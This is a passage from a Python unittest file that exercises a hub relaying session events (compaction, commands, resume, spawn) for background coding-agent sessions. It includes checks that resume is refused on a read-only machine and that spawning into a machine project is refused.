                             [o["result"]["session"]], "one session")
            self.ack(spawn)
        finally:
            os.unlink(os.path.join(self.claude, "bg-sleep"))

    def test_e_a_compaction_reaches_the_browsers_as_dx4_compact(self):
        count = len(self.hub.messages())
        compact = self.send(self.rpc("compact", {"session": self.sid}))
        self.assertEqual(self.outcome(compact), {"state": "done", "result": {"at": "now"}})
        ms = self.hub.wait(lambda ms: len([m for m in ms[count:] if m["kind"] == "compact"]) >= 2 and ms, timeout=20)
        self.assertIsNotNone(ms, "the compaction's progress, relayed")
        self.assertEqual([m["body"] for m in ms[count:] if m["kind"] == "compact"],
                         [{"rpc": compact["nonce"], "phase": "start"},
                          {"rpc": compact["nonce"], "phase": "end", "tokensBefore": 9000, "tokensAfter": 1200}])
        self.ack(compact)

    def test_h_a_desk_commands_run_reaches_the_browsers_as_dx4_op(self):
        count = len(self.hub.messages())
        asked = self.send(self.rpc("command", {"session": self.sid, "name": "rename", "args": "desk-m0"}))
        o = self.outcome(asked)
        self.assertEqual((o["state"], o["result"]["queued"], o["result"]["route"]), ("done", True, "run"))
        ms = self.hub.wait(lambda ms: len([m for m in ms[count:] if m["kind"] == "op"]) >= 2 and ms, timeout=20)
        self.assertIsNotNone(ms, "the run's start and end, relayed")
        self.assertEqual([(m["body"]["rpc"], m["body"]["phase"]) for m in ms[count:] if m["kind"] == "op"],
                         [(asked["nonce"], "start"), (asked["nonce"], "end")])
        self.ack(asked)

    def human_from_outside(self, sid, alias, text):
        """A web `human` to the session: through a browser of the local hub,
        or stored at the stand-in as the hub would store it. Its key."""
        if self.local():
            draft = {"kind": "human", "from": "human", "member": self.member, "text": text,
                     "to": [{"session": sid, "alias": alias}], "created": sminos.now(ms=True)}
            sealed = codes.seal(self.key, "log", self.pid, draft, codes.b64url(os.urandom(16)))
            self.hub.socket.send({"t": "human", "event": sealed})
            ack = wait_for(lambda: [f for f in self.hub.socket.received()
                                    if f.get("t") == "human-ack" and f["nonce"] == sealed["mac"]["nonce"]])
            self.assertTrue(ack, "the hub stored it")
            return {"writer": ack[0]["writer"], "seq": ack[0]["seq"]}
        e = tpr.hub_human(self.key, self.pid, sid, alias, text, 1)
        status, body = tsp.call(self.hub.url, "POST", "/control/inject", {"project": self.pid, "events": [e]})
        self.assertEqual(status, 200, body)
        return {"writer": e["writer"], "seq": e["seq"]}

    def delivery(self, key, sid, since):
        """The outcomes the hub was told of for the event to the session."""
        return [m["body"]["outcome"] for m in self.hub.messages()[since:]
                if m["kind"] == "delivery" and m["body"]["event"] == key and m["session"] == sid]

    def test_f_resume_brings_an_ended_session_back_and_what_was_recorded_is_delivered(self):
        """G4 through the hub, with G3's last clause: a message from the web
        to a closed terminal session is reported `recorded`; Resume brings the
        session back as a --bg job under its own id; at the tick it asks for,
        the session rejoins and the message is delivered, its outcome turning
        `delivered`. A second Resume finds it live; a read-only machine
        refuses Resume."""
        sid = ended_session(self.root)
        alias = sminos.view_of(tpr.project_of(self.root), titles=False).info[sid]["joined"]["alias"]
        count = len(self.hub.messages())
        key = self.human_from_outside(sid, alias, "pick up where you left off")
        self.assertTrue(wait_for(lambda: self.delivery(key, sid, count) == ["recorded"], 20),
                        "recorded for a closed terminal session: %s" % self.delivery(key, sid, count))
        tpr.set_policy({"read_only": True})
        self.assertEqual(self.outcome(self.send(self.rpc("resume", {"session": sid})))["error"]["code"], "read-only")
        tpr.clear_policy()
        self.assertEqual(resumes(self.claude, sid), [], "nothing launched on a read-only machine")
        resume = self.send(self.rpc("resume", {"session": sid}))
        self.assertEqual(self.outcome(resume, timeout=60), {"state": "done", "result": {"session": sid}})
        self.ack(resume)
        self.assertEqual(resumes(self.claude, sid), [{"args": ["--bg", "--resume", sid],
                                                      "cwd": os.path.realpath(self.root)}])
        r = cli("daemon", "tick")  # the tick the Resume nudged the loop for
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertTrue(wait_for(lambda: self.delivery(key, sid, count)[-1:] == ["delivered"], 20),
                        "its outcome turns delivered: %s" % self.delivery(key, sid, count))
        with open(os.path.join(self.claude, "inbox-%s.log" % sid)) as f:
            self.assertIn("pick up where you left off", f.read(), "delivered to the resumed session")
        latest = sminos.view_of(tpr.project_of(self.root), titles=False).info[sid]["latest"]
        self.assertEqual(latest["kind"], "joined", "it rejoined")
        again = self.send(self.rpc("resume", {"session": sid}))
        self.assertEqual(self.outcome(again, timeout=60)["error"]["code"], "session-live")
        self.ack(again)
        self.assertEqual(len(resumes(self.claude, sid)), 1, "one session")

    def test_g_a_spawn_into_the_machine_project_is_refused_unknown_checkout(self):
        """A machine project has no checkout anywhere: a stray's directory
        resolves to it, a session joins it from there, and still a spawn into
        it is refused (the org directory, §3)."""
        if self.local():
            self.skipTest("the stand-in's: a hub before machine projects knows none to route")
        stray_dir = os.path.join(T, "stray-dir")
        os.makedirs(stray_dir, exist_ok=True)
        stray = tpr.Session(stray_dir, inbox=False)
        try:
            mp = sminos.machine_project_id(self.hub.org, self.hub.machine)
            sminos.forget_caches()
            self.assertEqual(tpr.project_of(stray_dir).id, mp, "the stray's directory is in the machine project")
            r = cli("list")
            self.assertEqual(r.returncode, 0, r.stderr)
            self.assertIn(stray.sid, sminos.view_of(sminos.own_machine_project(), titles=False).info,
                          "and the stray joined it from there")
            self.assertEqual(policy.known_checkouts(sminos.own_machine_project()), [])
            before = len(launches(self.claude))
            o = self.outcome(self.send(sign(self.key, "spawn", mp, {"checkout": stray_dir, "brief": "b"},
                                            machine=self.hub.machine, member=self.member)))
            self.assertEqual(o["error"]["code"], "unknown-checkout")
            self.assertEqual(len(launches(self.claude)), before, "nothing launched")
        finally:
            stray.end()


if __name__ == "__main__":
    try:
        unittest.main(verbosity=2)
    finally:
        shutil.rmtree(T, ignore_errors=True)
